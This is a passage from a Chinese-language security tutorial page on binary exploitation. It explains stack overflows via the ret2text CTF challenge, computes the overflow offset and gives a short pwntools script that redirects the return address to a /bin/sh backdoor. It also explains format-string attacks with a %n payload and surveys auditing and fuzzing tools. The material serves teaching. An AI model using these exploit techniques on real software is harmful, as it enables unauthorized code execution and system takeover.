<span class="line"><span style="color:#D73A49;">push</span><span style="color:#24292E;">    </span><span style="color:#005CC5;">rbp</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">rbp</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">rsp</span></span>
<span class="line"><span style="color:#D73A49;">sub</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">rsp</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">10h</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">rax</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">fs</span><span style="color:#24292E;">:</span><span style="color:#005CC5;">28h</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     [</span><span style="color:#005CC5;">rbp</span><span style="color:#24292E;">+var_8], </span><span style="color:#005CC5;">rax</span></span>
<span class="line"><span style="color:#D73A49;">xor</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">eax</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">eax</span></span>
<span class="line"><span style="color:#D73A49;">lea</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">rdx</span><span style="color:#24292E;">, [</span><span style="color:#005CC5;">rbp</span><span style="color:#24292E;">+var_C]</span></span>
<span class="line"><span style="color:#D73A49;">lea</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">rax</span><span style="color:#24292E;">, [</span><span style="color:#005CC5;">rbp</span><span style="color:#24292E;">+var_10]</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">rsi</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">rax</span></span>
<span class="line"><span style="color:#D73A49;">lea</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">rax</span><span style="color:#24292E;">, format     </span><span style="color:#6A737D;">; &quot;%d %d&quot;</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">rdi</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">rax</span><span style="color:#24292E;">        </span><span style="color:#6A737D;">; format</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">eax</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">0</span></span>
<span class="line"><span style="color:#D73A49;">call</span><span style="color:#24292E;">    _scanf</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">edx</span><span style="color:#24292E;">, [</span><span style="color:#005CC5;">rbp</span><span style="color:#24292E;">+var_C]</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">eax</span><span style="color:#24292E;">, [</span><span style="color:#005CC5;">rbp</span><span style="color:#24292E;">+var_10]</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">esi</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">edx</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">edi</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">eax</span></span>
<span class="line"><span style="color:#D73A49;">call</span><span style="color:#24292E;">    </span><span style="color:#D73A49;">add</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">esi</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">eax</span></span>
<span class="line"><span style="color:#D73A49;">lea</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">rax</span><span style="color:#24292E;">, aD         </span><span style="color:#6A737D;">; &quot;%d&quot;</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">rdi</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">rax</span><span style="color:#24292E;">        </span><span style="color:#6A737D;">; format</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">eax</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">0</span></span>
<span class="line"><span style="color:#D73A49;">call</span><span style="color:#24292E;">    _printf</span></span>
<span class="line"><span style="color:#D73A49;">mov</span><span style="color:#24292E;">     </span><span style="color:#005CC5;">eax</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">0</span></span>
<span class="line"><span style="color:#D73A49;">leave</span></span>
<span class="line"><span style="color:#D73A49;">retn</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br></div></div><p>可以看到其中使用 <code>call</code> 指令来调用 <code>add</code> 函数。那么该指令是如何工作的呢？其实 <code>call</code> 指令相当于 <code>push next_loc;jmp loc</code> ，通过将 <code>call</code> 指令下一行汇编的地址压栈的方式，等到函数调用完再取回，从而从 <code>call</code> 指令的下一行继续执行。由于栈地址从高向低生长，新调用的函数的局部变量生成在返回地址的上方（低地址处），因此如果我们在新函数中使用栈溢出来修改这一返回地址，如果将返回地址修改为某个函数的地址，就可以执行任意函数：</p><p><img src="https://cdn.xyxsw.site/stack2.png" alt=""></p><blockquote><p>注意该图中，使用 32 位的寄存器（EBP、ESP、EIP），实际原理一样的，并且上方为高地址，下方为低地址</p></blockquote><p>在此给出一道题作为例子：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" target="_blank" rel="noreferrer">ret2tetx</a></p><p>32 位的程序，我们使用 IDA 来打开该题目，查看反编译代码，可以发现有非常明显的栈溢出：</p><p><img src="https://cdn.xyxsw.site/main.png" alt=""></p><p>由于第 <code>8</code> 行 <code>gets</code> 函数并没有检查输入的长度和 <code>s</code> 的长度，我们可以轻易地通过栈溢出来控制 <code>main</code> 函数的返回地址。而在程序中，存在另外一个函数 <code>secure</code> ，在该函数中有一个后门 <code>system(&quot;/bin/sh&quot;)</code> ，如果我们想办法执行该后门，就可以拿到目标机器的 <code>shell</code> ，从而控制目标计算机。</p><p>由于我们需要将返回地址在标准输入中输入待测程序，而返回地址拆分成小端序的字节后经常无法手动输入到待测程序中，所以此处我们使用 <code>pwntools</code> 这一 <code>python</code> 包来方便地进行攻击。 首先查看后门的地址：</p><p><img src="https://cdn.xyxsw.site/backdoor.png" alt=""></p><p>接着计算溢出长度，这里我们使用 gdb 来调试程序，图中的 gdb 安装了 pwndbg 插件，该插件在 pwn 调试时比较好用：</p><p><img src="https://cdn.xyxsw.site/gdb.png" alt=""></p><p>将断点打在 <code>gets</code> 函数前后，可以看到此时 <code>esp</code> 值为 <code>0xffffcd80</code> ， <code>ebp</code> 值为 <code>0xffffce08</code> ，在 IDA 中我们又可以看到 <code>s</code> 相对于 <code>esp</code> 的偏移为 <code>+1C</code> ，此时我们即可计算 <code>hex(0xffffcd80+0x1c-0xffffce08)=-0x6C</code> ，即 <code>s</code> 相对于 <code>ebp</code> 的偏移为 <code>0x6C</code> ，由于在 <code>main</code> 函数的开头有 <code>push ebp</code> 的操作，所以将 <code>0x6C</code> 再加 <code>4</code> ，即可到达返回地址处：</p><p><img src="https://cdn.xyxsw.site/s.png" alt=""></p><div class="language-python vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> pwn </span><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">*</span></span>
<span class="line"><span style="color:#E1E4E8;">sh</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">process(</span><span style="color:#9ECBFF;">&quot;./pwn&quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">exp</span><span style="color:#F97583;">=</span><span style="color:#F97583;">b</span><span style="color:#9ECBFF;">&#39;a&#39;</span><span style="color:#F97583;">*</span><span style="color:#E1E4E8;">(</span><span style="color:#F97583;">0x</span><span style="color:#79B8FF;">6c</span><span style="color:#F97583;">+</span><span style="color:#79B8FF;">4</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">exp</span><span style="color:#F97583;">+=</span><span style="color:#E1E4E8;">p32(</span><span style="color:#F97583;">0x</span><span style="color:#79B8FF;">0804863A</span><span style="color:#E1E4E8;">) </span><span style="color:#6A737D;"># 4 字节的返回地址</span></span>
<span class="line"><span style="color:#E1E4E8;">sh.sendline(exp)</span></span>
<span class="line"><span style="color:#E1E4E8;">sh.interactive() </span><span style="color:#6A737D;"># 切换为手动交互模式</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">from</span><span style="color:#24292E;"> pwn </span><span style="color:#D73A49;">import</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">*</span></span>
<span class="line"><span style="color:#24292E;">sh</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">process(</span><span style="color:#032F62;">&quot;./pwn&quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">exp</span><span style="color:#D73A49;">=</span><span style="color:#D73A49;">b</span><span style="color:#032F62;">&#39;a&#39;</span><span style="color:#D73A49;">*</span><span style="color:#24292E;">(</span><span style="color:#D73A49;">0x</span><span style="color:#005CC5;">6c</span><span style="color:#D73A49;">+</span><span style="color:#005CC5;">4</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">exp</span><span style="color:#D73A49;">+=</span><span style="color:#24292E;">p32(</span><span style="color:#D73A49;">0x</span><span style="color:#005CC5;">0804863A</span><span style="color:#24292E;">) </span><span style="color:#6A737D;"># 4 字节的返回地址</span></span>
<span class="line"><span style="color:#24292E;">sh.sendline(exp)</span></span>
<span class="line"><span style="color:#24292E;">sh.interactive() </span><span style="color:#6A737D;"># 切换为手动交互模式</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><img src="https://cdn.xyxsw.site/shell.png" alt=""></p><h5 id="_0x1" tabindex="-1">0x1 <a class="header-anchor" href="#_0x1" aria-label="Permalink to &quot;0x1&quot;">​</a></h5><p>通过上面的学习，我们已经可以知道执行任意函数的办法，但很多情况下，对于攻击者来说，程序中并没有可用的后门函数来达到攻击的目的，因此我们需要一种手段，来让程序执行任意代码（任意汇编代码），这样就可以最高效地进行攻击。ROP（Return Oriented Programming）面向返回编程就是这样的一种技术，在栈溢出的基础上，通过在程序中寻找以 retn 结尾的小片段（gadgets），来改变某些寄存器、栈变量等的值，再结合 Linux 下的系统调用，我们就可以执行需要的任意代码。</p><p>ROP 网上已有非常系统的资料，在这里不做过多的叙述，可参考 ctf-wiki: <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode" target="_blank" rel="noreferrer">ret2shellcode</a></p><h3 id="格式化字符串" tabindex="-1">格式化字符串 <a class="header-anchor" href="#格式化字符串" aria-label="Permalink to &quot;格式化字符串&quot;">​</a></h3><p>格式化字符串的利用思路来源于 <code>printf</code> 函数中的 <code>%n</code> format 标签，该标签的作用和 <code>%s</code> 、 <code>%d</code> 等不同，是将已打印的字符串的长度返回到该标签对应的变量中。在正常情况下的使用不会出现什么问题：</p><div class="language-c vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">c</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#B392F0;">printf</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;abcd</span><span style="color:#79B8FF;">%n</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">,</span><span style="color:#F97583;">&amp;</span><span style="color:#FFAB70;">num</span><span style="color:#E1E4E8;">);</span></span>
<span class="line"><span style="color:#6A737D;">//输出abcd,并且num的值为4</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6F42C1;">printf</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;abcd</span><span style="color:#005CC5;">%n</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">,</span><span style="color:#D73A49;">&amp;</span><span style="color:#E36209;">num</span><span style="color:#24292E;">);</span></span>
<span class="line"><span style="color:#6A737D;">//输出abcd,并且num的值为4</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>但如果在编写代码时忘记 format 字符串：</p><div class="language-c vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">c</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#B392F0;">printf</span><span style="color:#E1E4E8;">(something_want_print);</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6F42C1;">printf</span><span style="color:#24292E;">(something_want_print);</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p>此时若攻击者可以自定义该字符串，就可以使用 <code>%d</code> 、 <code>%p</code> 、 <code>%s</code> 等打印栈上数据，或者 <code>%n</code> 来覆写栈上的数据，如果覆写了返回地址，就可以实现任意代码执行。</p><div class="language-c vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">c</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">char</span><span style="color:#E1E4E8;"> </span><span style="color:#FFAB70;">ch</span><span style="color:#E1E4E8;">[</span><span style="color:#79B8FF;">20</span><span style="color:#E1E4E8;">];</span></span>
<span class="line"><span style="color:#B392F0;">scanf</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;">%s</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">,ch);</span><span style="color:#6A737D;">// 输入 %d%n%n%n%n%n</span></span>
<span class="line"><span style="color:#B392F0;">printf</span><span style="color:#E1E4E8;">(ch);</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">char</span><span style="color:#24292E;"> </span><span style="color:#E36209;">ch</span><span style="color:#24292E;">[</span><span style="color:#005CC5;">20</span><span style="color:#24292E;">];</span></span>
<span class="line"><span style="color:#6F42C1;">scanf</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;</span><span style="color:#005CC5;">%s</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">,ch);</span><span style="color:#6A737D;">// 输入 %d%n%n%n%n%n</span></span>
<span class="line"><span style="color:#6F42C1;">printf</span><span style="color:#24292E;">(ch);</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="漏洞挖掘技术" tabindex="-1">漏洞挖掘技术 <a class="header-anchor" href="#漏洞挖掘技术" aria-label="Permalink to &quot;漏洞挖掘技术&quot;">​</a></h2><h3 id="代码审计" tabindex="-1">代码审计 <a class="header-anchor" href="#代码审计" aria-label="Permalink to &quot;代码审计&quot;">​</a></h3><p>代码审计分人工代码审计和自动化代码审计，人工审计由安全研究人员查看代码来发现漏洞，需要安全研究人员很高的研究经验，投入大量的人力。自动化代码审计目前的发展进度迅速，如由 Vidar-Team 毕业学长 LoRexxar 主导的开源项目 <a href="https://github.com/LoRexxar/Kunlun-M" target="_blank" rel="noreferrer">Kunlun-M</a></p><p>以及字节跳动公司开源的 <a href="https://github.com/bytedance/appshark" target="_blank" rel="noreferrer">appshark</a></p><h3 id="fuzz" tabindex="-1">fuzz <a class="header-anchor" href="#fuzz" aria-label="Permalink to &quot;fuzz&quot;">​</a></h3><p>fuzz 是一种自动化测试手段，通过一定的算法生成一定规律的随机的数据输入到程序中，如果程序发生崩溃等异常，即可知道此处可能有漏洞。比较著名的有<a href="https://github.com/google/AFL" target="_blank" rel="noreferrer"> AFL</a>、<a href="https://github.com/AFLplusplus/AFLplusplus" target="_blank" rel="noreferrer">AFLplusplus</a>、<a href="https://llvm.org/docs/LibFuzzer.html" target="_blank" rel="noreferrer">libfuzzer</a>、<a href="https://github.com/google/honggfuzz" target="_blank" rel="noreferrer">honggfuzz</a> 等。</p>`,57),e=[o];function c(r,t,y,E,i,d){return n(),a("div",null,e)}const u=s(l,[["render",c]]);export{b as __pageData,u as default};
